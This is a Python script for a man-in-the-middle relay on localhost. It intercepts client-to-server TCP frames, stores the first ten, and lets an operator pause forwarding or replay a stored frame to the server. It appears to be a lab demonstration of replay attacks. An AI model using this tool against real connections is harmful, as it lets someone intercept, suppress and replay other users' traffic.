from time import sleep
import socket
import threading
import random

LISTEN_HOST, LISTEN_PORT = '127.0.0.1', 5001
REAL_HOST, REAL_PORT     = '127.0.0.1', 5000

BUFFERED = []
N = 10

# Control flag: when set, client→server frames get forwarded
relay_enabled = threading.Event()
relay_enabled.set()

def relay(src, dst, direction):
    """Forward data src→dst, capture first N client→server frames."""
    count = 0
    while True:
        data = src.recv(4096)
        if not data:
            break

        if direction == 'c2s':
            # Capture first N frames
            if count < N:
                print(f"[MITM] Storing frame #{count+1}")
                BUFFERED.append(data)
                count += 1

            # Only forward if relay_enabled is set
            if relay_enabled.is_set():
                dst.sendall(data)
            else:
                # paused: drop (don’t forward) but still read
                pass

        else:  # direction == 's2c'
            # always forward server→client
            dst.sendall(data)

    dst.close()

def control_loop(server_conn):
    """Read console commands to pause/resume/replay/quit."""
    print("[MITM] Client intercepted!")
    while True:
        cmd = input().strip().lower()
        if cmd == 'p':
            relay_enabled.clear()
            print("[MITM] Relay paused.")
        elif cmd == 'c':
            relay_enabled.set()
            print("[MITM] Relay continuing.")
        elif cmd == 'r':
            if BUFFERED:
                frame = random.choice(BUFFERED)
                server_conn.sendall(frame)
                print(f"[MITM] Replayed one buffered frame ({len(frame)} bytes).")
            else:
                print("[MITM] Buffer is empty.")
        elif cmd == 'q':
            print("[MITM] Quitting.")
            server_conn.close()
            break
        else:
            print("[MITM] Unknown command.")

def main():
    # 1) listen for client
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((LISTEN_HOST, LISTEN_PORT))
    listener.listen(1)
    print(f"[MITM] Listening on {LISTEN_HOST}:{LISTEN_PORT}, forwarding to {REAL_HOST}:{REAL_PORT}")

    client_conn, _ = listener.accept()

    # 2) connect to real server
    server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_conn.connect((REAL_HOST, REAL_PORT))

    # 3) start relays
    threading.Thread(target=relay, args=(client_conn, server_conn, 'c2s'), daemon=True).start()
    threading.Thread(target=relay, args=(server_conn, client_conn, 's2c'), daemon=True).start()

    # 4) enter control loop
    control_loop(server_conn)

if __name__ == "__main__":
    main()
